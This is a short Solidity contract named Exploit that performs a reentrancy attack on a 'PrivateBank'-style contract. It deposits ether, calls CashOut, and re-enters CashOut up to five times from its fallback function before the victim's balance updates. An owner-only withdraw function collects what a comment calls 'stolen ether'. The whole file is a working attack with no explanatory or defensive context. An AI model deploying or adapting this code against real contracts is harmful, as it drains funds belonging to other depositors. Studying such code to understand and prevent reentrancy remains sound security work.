pragma solidity ^0.4.19;

interface IPrivateBank {
    function Deposit() external payable;
    function CashOut(uint _am) external;
}

contract Exploit {
    IPrivateBank public target;
    address public owner;
    uint public reentrancyCount = 0;
    uint constant maxReentries = 5; // Limit recursion to avoid running out of gas

    constructor(address _targetAddress) public {
        target = IPrivateBank(_targetAddress);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Minimum deposit required");
        target.Deposit.value(msg.value)();     // Step 1: Deposit
        target.CashOut(msg.value);             // Step 2: Initial withdraw triggers fallback
    }

    // Fallback triggered during .call.value(_am)()
    function () external payable {
        if (reentrancyCount < maxReentries) {
            reentrancyCount++;
            target.CashOut(msg.value);         // Step 3: Re-enter before balance update
        }
    }

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(address(this).balance); // Collect stolen ether
    }
}

